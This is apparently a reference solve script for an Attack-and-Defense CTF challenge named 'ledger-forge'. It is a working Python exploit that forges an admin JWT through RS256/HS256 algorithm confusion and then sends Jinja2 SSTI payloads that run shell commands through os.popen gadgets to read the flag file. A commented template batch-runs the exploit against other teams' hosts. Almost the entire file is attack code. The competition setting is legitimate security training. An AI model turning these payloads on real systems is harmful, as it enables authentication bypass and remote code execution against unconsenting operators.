#!/usr/bin/env python3
"""
Reference exploit for ledger-forge.

The chain (two planted bugs):
  1. JWT ALGORITHM CONFUSION — GET /pubkey returns the RSA public-key PEM. The
     server's hand-rolled verifier accepts HS256 tokens HMAC-keyed with that
     PEM's BYTES, so we forge {"user":"pwn","role":"admin"} and it verifies as
     admin.
  2. SSTI — POST /admin/report renders our Jinja2 template server-side. With the
     forged admin token we inject a payload that reads $GZCTF_FLAG_FILE.

In Attack & Defense this runs against OTHER teams' instances each tick and the
captured flags are submitted via the in-game Toolkit API (template pattern at
the bottom). Dependency-light: just `requests` + a manual JWT forge.

    python3 solve.py [HOST] [PORT]        # default 127.0.0.1 8080
"""
import base64
import hashlib
import hmac
import json
import re
import sys

import requests

FLAG_RE = re.compile(r"flag\{[^}]*\}")

# SSTI payloads to try in order. Jinja's expression namespace doesn't expose
# __import__, so we reach os purely through gadgets (lipsum/cycler __globals__)
# and read $GZCTF_FLAG_FILE through that same os reference. First hit wins.
SSTI_PAYLOADS = [
    "{{ lipsum.__globals__.os.popen('cat ' + lipsum.__globals__.os.environ.get('GZCTF_FLAG_FILE','/flag')).read() }}",
    "{{ cycler.__init__.__globals__.os.popen('cat ' + cycler.__init__.__globals__.os.environ.get('GZCTF_FLAG_FILE','/flag')).read() }}",
    "{{ self.__init__.__globals__.__builtins__.open(self.__init__.__globals__.os.environ.get('GZCTF_FLAG_FILE','/flag')).read() }}",
]


def _b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def forge_admin_token(pub_pem: bytes) -> str:
    """Forge an HS256 admin token keyed with the public-key PEM bytes."""
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"user": "pwn", "role": "admin"}
    h_b64 = _b64url(json.dumps(header, separators=(",", ":")).encode())
    p_b64 = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h_b64}.{p_b64}".encode("ascii")
    sig = hmac.new(pub_pem, signing_input, hashlib.sha256).digest()
    return f"{h_b64}.{p_b64}.{_b64url(sig)}"


def _flag(text):
    m = FLAG_RE.search(text or "")
    return m.group(0) if m else None


def exploit(ip, port):
    """Run the full chain against one target; return the captured flag or None."""
    b = f"http://{ip}:{port}"

    # 1) fetch the public key — use .content (BYTES, no strip) so the HMAC
    #    secret is byte-identical to what the server uses.
    r = requests.get(f"{b}/pubkey", timeout=5)
    if r.status_code != 200 or b"BEGIN PUBLIC KEY" not in r.content:
        return None
    pub_pem = r.content

    # 2) forge the admin token from the PEM bytes.
    token = forge_admin_token(pub_pem)
    auth = {"Authorization": f"Bearer {token}"}

    # 3) SSTI via /admin/report — try payloads until one yields the flag.
    for payload in SSTI_PAYLOADS:
        try:
            rr = requests.post(
                f"{b}/admin/report",
                headers=auth,
                json={"title": "x", "template": payload},
                timeout=5,
            )
        except requests.RequestException:
            continue
        flag = _flag(rr.text)
        if flag:
            return flag
    return None


if __name__ == "__main__":
    ip = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    flag = exploit(ip, port)
    if flag:
        print(flag)
    else:
        print("no flag captured", file=sys.stderr)
        sys.exit(1)


# ---------------------------------------------------------------------------
# A&D batch submission (template pattern — fill in from the in-game Toolkit):
#
#   base, game_id, token = "https://ctf...", 1, "<bearer>"
#   targets = requests.get(f"{base}/api/Game/{game_id}/Ad/Targets",
#                          headers={"Authorization": f"Bearer {token}"}).json()
#   flags = []
#   for chal in targets["challenges"]:
#       for team in chal["teams"]:
#           if team.get("ip"):
#               f = exploit(team["ip"], team["port"])
#               if f:
#                   flags.append(f)
#   requests.post(f"{base}/api/Game/{game_id}/Ad/Submit",
#                 headers={"Authorization": f"Bearer {token}"},
#                 json={"flags": flags})
# ---------------------------------------------------------------------------
